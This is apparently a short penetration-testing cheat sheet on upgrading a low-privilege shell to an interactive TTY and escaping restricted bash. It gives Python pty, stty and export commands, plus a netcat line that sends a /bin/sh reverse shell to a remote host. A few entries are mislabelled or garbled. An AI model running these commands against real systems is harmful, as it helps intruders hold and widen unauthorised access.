### **Introduction**

When you find yourself with a low-privilege shell, upgrading it to a fully interactive shell is crucial. Here’s a guide to making your shell fully interactive, including initial steps and additional tips for a smooth experience.

### **Step 1: Upgrade the Shell**

1.  Check the availability of Python versions:.   
    `which python python2 python3`
	
2.  Upgrade the Shell Using Python 2:  
    `python2 -c 'import pty; pty.spawn("/bin/bash")'`
	
3.  Upgrade the Shell Using Python 3:  
    `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    

### **Step 2: Set PATH and TERM Variables**

Next, set the `PATH` and `TERM` environment variables to ensure proper functionality of shell commands and terminal capabilities:

1.  Set the PATH:  
    `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp`
2.  Set the TERM:  
    `export TERM=xterm-256color`

### **Step 3: Handle Background Processes**

If you need to suspend the current shell process and bring it to the foreground later, use the following key combinations and commands:

1.  Press `Ctrl + Z` to suspend the current process and return to the parent shell.
2.  Enter raw mode and bring the process back to the foreground:  
    `stty raw -echo; fg`
3.  Reset the terminal settings to a sane state:  
    `reset`

### **Step 4: Set Shell and Terminal Size**

Adjust the terminal window size for better readability and to avoid display issues:

1.  Set the terminal size:  
    `stty columns 200 rows 200`

### **Bypassing Restricted Bash Environments**

Use the following commands to bypass restricted bash environments:

1.  Using Perl:  
    `perl -e 'exec "/bin/sh";'`
2.  Using a shell:  
    `/bin/sh -i`
3.  Using the exec function:  
    `exec "/bin/sh";`
4.  Using echo with os.system:  
    `echo os.system('/bin/bash')`
5.  Using netcat with SSH:  
    `/bin/sh -i`
6.  Using netcat with SSH:  
    `ssh [USER]@[IP-ADRESS] nc $[LOCALIP] 4444 -e /bin/sh`
7.  Exporting TERM:  
    `export TERM=linux`